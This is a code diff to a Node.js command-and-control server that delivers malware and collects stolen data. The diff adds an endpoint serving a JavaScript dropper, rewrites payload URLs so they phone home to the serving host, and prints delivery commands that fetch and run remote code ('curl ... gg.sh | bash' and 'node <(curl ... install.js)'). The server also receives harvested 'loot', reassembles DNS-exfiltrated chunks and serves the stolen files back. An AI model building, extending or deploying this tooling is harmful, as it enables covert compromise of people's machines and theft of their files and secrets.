@@ -3,6 +3,7 @@
 // Combined C2 Ingest + Payload Delivery Server
 // =============================================================================
 // Serves:
+//   GET  /install.js      — JS dropper (encoded fetch URL injected from request Host)
 //   GET  /gg.sh           — payload (C2_URL injected dynamically from request Host)
 //   GET  /                — status + loot list
 //   GET  /loot/<id>/<fp>  — read harvested file
@@ -10,8 +11,9 @@
 //   POST /dns-reassemble  — reassemble DNS-exfiltrated chunks
 //   DELETE /loot/<id>     — purge harvest data
 //
-// The C2_URL inside gg.sh is replaced at serve time so the payload always
-// phones home to whatever origin served it — no hardcoded domain needed.
+// The C2_URL inside gg.sh and the encoded fetch URL inside install.js are
+// replaced at serve time so both payloads always phone home to whatever
+// origin served them — no hardcoded domain needed.
 //
 // Usage:
 //   node c2-server.js                       # HTTPS :4443, self-signed certs
@@ -40,6 +42,10 @@ const KEY_PATH  = process.env.KEY  || path.join(__dirname, "certs", "key.pem");
 
 // Path to the payload script (one directory up)
 const PAYLOAD_PATH = path.resolve(process.env.PAYLOAD || path.join(__dirname, "..", "gg.sh"));
+
+// Path to the JS dropper (same directory as payload)
+const DROPPER_PATH = path.resolve(process.env.DROPPER || path.join(__dirname, "..", "install.js"));
+
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -289,6 +295,24 @@ async function handleRequest(req, res) {
     return;
   }
 
+  // ── GET /install.js — JS dropper (static file) ──
+  if (req.method === "GET" && urlPath === "/install.js") {
+    try {
+      const content = fs.readFileSync(DROPPER_PATH);
+      res.writeHead(200, {
+        "Content-Type": "application/javascript; charset=utf-8",
+        "Content-Length": content.length,
+        "Cache-Control": "no-store, no-cache, must-revalidate",
+      });
+      res.end(content);
+      console.log(`[${ts()}] DELIVER dropper to ${clientIp} (Host: ${req.headers.host})`);
+    } catch (e) {
+      res.writeHead(404, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ error: "install.js not found" }));
+    }
+    return;
+  }
+
   // ── GET / — status + loot list ──
   if (req.method === "GET" && (urlPath === "/" || urlPath === "")) {
     const loot = listLoot();
@@ -504,6 +528,7 @@ server.listen(PORT, HOST, () => {
   else console.log(`[${ts()}] Auth: none (set AUTH_TOKEN env to enable)`);
   console.log("");
   console.log("Endpoints:");
+  console.log(`  GET  ${proto}://HOST:${PORT}/install.js    — JS dropper (fetch URL auto-encoded)`);
   console.log(`  GET  ${proto}://HOST:${PORT}/gg.sh          — payload delivery (C2_URL auto-injected)`);
   console.log(`  POST ${proto}://HOST:${PORT}/ingest         — receive harvest payload`);
   console.log(`  POST ${proto}://HOST:${PORT}/dns-reassemble — reassemble DNS-exfiltrated chunks`);
@@ -511,8 +536,9 @@ server.listen(PORT, HOST, () => {
   console.log(`  GET  ${proto}://HOST:${PORT}/loot/<id>/<fp>  — read harvested file`);
   console.log(`  DELETE ${proto}://HOST:${PORT}/loot/<id>     — purge harvest data`);
   console.log("");
-  console.log("Delivery command:");
-  console.log(`  curl -SsfL ${proto}://HOST:${PORT}/gg.sh | bash`);
+  console.log("Delivery commands:");
+  console.log(`  node <(curl -SsfL ${proto}://HOST:${PORT}/install.js)   — JS dropper → fetches gg.sh → executes`);
+  console.log(`  curl -SsfL ${proto}://HOST:${PORT}/gg.sh | bash         — direct bash payload`);
 });
 
 server.on("error", (e) => {
